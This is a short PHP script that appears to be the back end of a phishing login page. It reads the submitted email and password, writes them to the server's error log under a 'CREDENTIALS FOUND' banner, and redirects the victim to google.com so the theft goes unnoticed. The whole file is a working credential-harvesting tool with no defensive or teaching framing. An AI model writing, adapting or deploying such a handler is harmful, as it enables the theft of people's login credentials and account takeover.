<?php
{
if ( isset ($_POST["Email"]))
$username = $_POST["Email"];
$password = $_POST["password"];
}
$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
error_log("[+] Credentials Found!!!");
error_log("$res");
echo "<script type='text/javascript'>window.location='https://google.com'</script>";
?>
